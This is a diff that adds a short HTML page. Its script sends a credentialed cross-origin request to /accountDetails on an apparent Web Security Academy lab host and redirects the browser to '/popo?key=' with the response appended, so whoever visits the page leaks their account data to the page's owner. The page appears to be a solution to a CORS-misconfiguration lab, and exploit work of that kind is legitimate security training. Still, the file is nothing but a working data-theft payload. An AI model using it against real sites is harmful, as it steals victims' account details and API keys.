@@ -1,0 +1,17 @@
+<html>
+    <body>
+	<script>
+		const request = new XMLHttpRequest();
+	
+		request.open("get", "https://xxxxxxxxxxxxxxURLxxxxxxxxxxxxxxx.web-security-academy.net/accountDetails", true);
+
+
+		request.onload = () => {
+                    window.location.href = "/popo?key=" + request.responseText;
+		};
+		
+		request.withCredentials = true;
+		request.send();
+	</script>
+    </body>
+</html>
